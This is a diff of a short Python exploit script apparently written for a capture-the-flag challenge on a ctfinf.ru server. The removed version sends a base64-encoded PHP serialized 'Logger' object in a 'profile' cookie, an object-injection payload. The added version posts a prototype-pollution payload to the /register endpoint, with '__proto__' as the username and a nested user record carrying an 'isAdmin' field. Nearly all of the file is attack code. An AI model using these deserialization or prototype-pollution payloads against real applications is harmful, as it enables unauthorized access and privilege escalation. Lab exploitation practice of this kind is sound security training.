@@ -1,14 +1,14 @@
 import requests
-import base64
 
-url = "http://ctfinf.ru:10036/"
+TARGET_URL = 'http://ctfinf.ru:10041'
 
-# Тестовый payload для проверки записи
-payload = 'O:6:"Logger":2:{s:14:"\x00Logger\x00log_file";s:15:"/var/log/app.log";s:1:"x";s:7:"saveLog";}'
-
-cookies = {
-    'profile': base64.b64encode(payload.encode()).decode()
-}
-
-response = requests.get(url, cookies=cookies)
-print(response.text)
+# make pollution
+requests.post(TARGET_URL + '/register', json = {
+    "username": "__proto__",
+    "password": "123",
+    "testuser": {
+        "username": "testuser",
+        "password": "202cb962ac59075b964b07152d234b70",
+        "isAdmin": "false"
+    }
+})
